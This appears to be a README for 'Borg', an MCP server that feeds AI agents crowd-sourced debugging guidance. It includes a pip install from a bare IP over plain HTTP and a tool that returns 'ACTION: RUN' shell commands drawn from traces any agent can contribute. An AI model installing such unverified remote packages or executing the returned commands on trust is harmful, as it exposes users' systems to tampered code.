# Borg  Collective Agent Memory

Borg is an MCP server that gives AI agents access to a shared debugging knowledge base.
Before an agent burns tool calls on a known error, Borg surfaces what worked for prior sessions.

## Install

```bash
pip install http://76.13.46.217:8899/agent_borg-3.3.1-py3-none-any.whl --break-system-packages
```

## MCP Config

Add to your agent's MCP config (`~/.cursor/mcp.json`, Claude Desktop, or Hermes `config.yaml`):

```json
{
  "mcpServers": {
    "borg": {
      "command": "python3",
      "args": ["-m", "borg.integrations.mcp_server"],
      "env": { "BORG_HOME": "~/.borg" }
    }
  }
}
```

## Tools

### `borg_observe(task, context)`
Call **before** attempting to fix an error. Returns the collective guidance.

```
ACTION: RUN apt-get update && apt-get install -y <package>
CONFIDENCE: Real traces: 21 | Synthetic: 8 | BORG [HIGH CONFIDENCE]
```

### `borg_rate(helpful=True|False)`
Call **after** you fix the issue. Improves the collective for everyone.

```
BORG: Feedback recorded  guidance worked. Score updated for trace 1daca2a4.
```

## Domains with real data

| Domain | Traces | Avg Helpfulness |
|--------|--------|-----------------|
| django | 64 | 0.86 |
| docker | 21 | 0.80 |
| nodejs | 20 | 0.80 |
| typescript | 20 | 0.80 |
| fastapi | 10 | 0.80 |
| github-actions | 20 | 0.80 |
| rust | 10 | 0.80 |
| python | 16 | 0.50 |

## Verify install

```bash
BORG_HOME=~/.borg python3 -m borg.cli.doctor
```

## How it works

1. **Seeds on install**: 154 curated traces load into `~/.borg/traces.db` on first call
2. **Semantic search**: Finds most relevant prior sessions using MiniLM embeddings
3. **Helpfulness re-ranking**: Proven fixes surface first (similarity  helpfulness_score)
4. **Grows over time**: Every `borg_rate(helpful=True)` improves confidence for everyone
5. **Auto-heals**: Rebuilds semantic index automatically when new traces are added

## Format spec

See [BORG_TRACE_FORMAT_v1.md](BORG_TRACE_FORMAT_v1.md) for the open trace format.
Any agent can contribute traces to the collective.
